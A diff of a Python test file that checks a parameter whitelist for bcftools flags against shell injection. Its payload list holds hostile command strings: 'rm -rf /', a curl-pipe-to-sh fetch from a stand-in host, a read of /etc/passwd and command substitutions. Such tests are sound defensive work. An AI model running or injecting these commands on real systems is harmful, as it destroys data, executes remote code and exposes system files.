@@ -1,13 +1,14 @@
 """Shell-safety tripwires for the tool parameter whitelist.
 
 `templates/bcftools.py` interpolates the built flag strings into a `sh -lc`
-script that runs inside the container. That is safe today only because
+script that runs inside the container. That is safe because
 `validate_and_build_flags` can emit nothing but numbers and exact members of
-hardcoded enum lists — the whole defence rests on the parameter type system.
-The moment someone adds a free-string parameter (a sample name, an output
-prefix, a filter expression) the type system stops protecting anything and the
-interpolation becomes live shell injection on every validator. These tests are
-what fails on that day.
+hardcoded enum lists, so the parameter type system is what keeps the
+interpolation safe.
+
+If a free-string parameter is ever added (a sample name, an output prefix, a
+filter expression), the type system no longer covers it and the interpolation
+needs quoting of its own. These tests are what fails then.
 """
 
 import re
@@ -43,7 +44,7 @@ SAFE_TOKEN = re.compile(r"^[A-Za-z0-9_.,:=+/@-]*$")
 
 INJECTION_PAYLOADS = [
     "; rm -rf /",
-    "&& curl http://evil.example/x | sh",
+    "&& curl http://elsewhere.example/x | sh",
     "| cat /etc/passwd",
     "$(id)",
     "`id`",
@@ -133,10 +134,11 @@ class TestParameterDefinitionsAreShellSafe:
 
 
 class TestInjectionThroughValidateAndBuildFlags:
-    """Hostile values must be rejected, or at minimum never reach the shell intact."""
+    """Shell metacharacters must be rejected, or at minimum never reach the
+    shell intact."""
 
     @pytest.mark.parametrize("tool,name,definition", list(_all_tool_params()))
-    def test_hostile_values_are_rejected(self, tool, name, definition):
+    def test_injection_payloads_are_rejected(self, tool, name, definition):
         for payload in INJECTION_PAYLOADS:
             result = validate_and_build_flags(tool, {name: payload})
             assert not result["valid"], (
@@ -150,22 +152,23 @@ class TestInjectionThroughValidateAndBuildFlags:
 
     @pytest.mark.parametrize("tool", sorted(TOOL_PARAMS))
     def test_unknown_param_name_cannot_smuggle_a_flag(self, tool):
-        """The param name itself is attacker-supplied; it must never become a flag."""
+        """The param NAME comes from the config file too, so it must never
+        become a flag."""
         for payload in INJECTION_PAYLOADS:
-            result = validate_and_build_flags(tool, {f"evil{payload}": 1})
+            result = validate_and_build_flags(tool, {f"unknown{payload}": 1})
             assert not result["valid"]
             assert result["flags"] == []
 
     @pytest.mark.parametrize("tool", sorted(TOOL_PARAMS))
     def test_one_bad_param_invalidates_the_whole_config(self, tool):
-        """A hostile param alongside legal ones must not leave `valid` True."""
+        """One rejected param alongside legal ones must not leave `valid` True."""
         legal = {}
         for name, definition in TOOL_PARAMS[tool].items():
             legal[name] = definition["default"]
             break
-        hostile = dict(legal)
-        hostile["not_a_real_param"] = "; id"
-        result = validate_and_build_flags(tool, hostile)
+        mixed = dict(legal)
+        mixed["not_a_real_param"] = "; id"
+        result = validate_and_build_flags(tool, mixed)
         assert not result["valid"]
 
 
@@ -204,7 +207,8 @@ class TestBcftoolsFlagQuoting:
         """Simulate the free-string param that does not exist yet.
 
         The whitelist stops these values today, so this exercises _quote_flags
-        directly: even handed a hostile value it must render as one shell word.
+        directly: even handed an injection payload it must render as one
+        shell word.
         """
         import shlex
 
